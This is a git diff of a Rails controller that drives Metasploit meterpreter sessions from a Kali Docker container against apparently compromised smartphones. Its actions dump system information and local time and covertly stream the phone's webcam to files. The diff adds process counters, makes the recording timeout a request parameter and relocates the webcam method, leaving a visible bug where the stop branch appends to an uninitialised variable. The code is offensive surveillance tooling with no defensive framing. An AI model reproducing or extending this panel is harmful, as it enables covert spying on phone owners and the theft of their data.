@@ -3,23 +3,70 @@ class SmartphonesController < InheritedResources::Base
   @@isWebcamRecordOn=false
 
   def dump_sysinfo
+    @@nrRunningProcesses+=1
     processCommand="sysinfo"
     commandOutput=start_msf_process(processCommand)
-    puts commandOutput
-
     respond_to do |format|
         format.js { render "dump_sysinfo", :locals => {:commandOutput => commandOutput}  }
       end
+    @@nrFinishedProcesses+=1
+    @@nrRunningProcesses-=1
+  end
+
+
+
+
+  def webcam_record
+    if !@@isWebcamRecordOn
+        commandTimeout=params[:exec_timeout].to_i
+        currentTime = DateTime.now
+        currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
+        @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
+        @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
+        #remove quality
+        processCommand="webcam_stream -v false -i 1 -s #{@fileNameJpeg} -t #{@fileNameHtml}"
+        commandOutput=start_msf_process(processCommand)
+        puts commandOutput
+
+        isOperationSuccessful=false
+        1.upto(commandTimeout) do |n|
+            if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
+              isOperationSuccessful = true
+              @@isWebcamRecordOn = true
+              sleep 5
+              break
+            else
+                puts "Waiting ..."
+            end
+            sleep 1
+          end
+
+        commandOutput=["Operation Failed"] if not isOperationSuccessful
+    else
+        commandOutput.append('Control+Z')
+        commandOutput.append(detach_session)
+        @@isWebcamRecordOn = false
     end
+    respond_to do |format|
+        format.js { render "webcam_record", :locals => {:commandOutput => commandOutput, :fileName => @fileNameHtml}  }
+      end
+end
+
+
+
+
+
 
     def dump_localtime
+      @@nrRunningProcesses+=1
       processCommand="localtime"
       commandOutput=start_msf_process(processCommand)
       puts commandOutput
-
       respond_to do |format|
           format.js { render "dump_localtime", :locals => {:commandOutput => commandOutput}  }
         end
+      @@nrFinishedProcesses+=1
+      @@nrRunningProcesses-=1
     end
 
     def set_audio_mode
@@ -138,46 +185,7 @@ class SmartphonesController < InheritedResources::Base
 
 
 
-    def webcam_record
-      commandOutput=[]
-      fileName="None"
-      if !@@isWebcamRecordOn
-          commandTimeout=20
-          currentTime = DateTime.now
-          currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
-          @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
-          @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
-          #remove quality
-          processCommand="webcam_stream -v false -i 1 -s #{@fileNameJpeg} -t #{@fileNameHtml}"
-          commandOutput=start_msf_process(processCommand)
-          puts commandOutput
-
-          isOperationSuccessful=false
-          1.upto(commandTimeout) do |n|
-              if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
-                isOperationSuccessful = true
-                @@isWebcamRecordOn = true
-                sleep 5
-                break
-              else
-                  puts "Waiting ..."
-              end
-              sleep 1
-            end
-
-          commandOutput=["Operation Failed"] if not isOperationSuccessful
-      else
-          commandOutput.append('Control+Z')
-          commandOutput.append(detach_session)
-          @@isWebcamRecordOn = false
-      end
-
-
-
-      respond_to do |format|
-          format.js { render "webcam_record", :locals => {:commandOutput => commandOutput, :fileName => @fileNameHtml}  }
-        end
-  end
+    
 
 
 
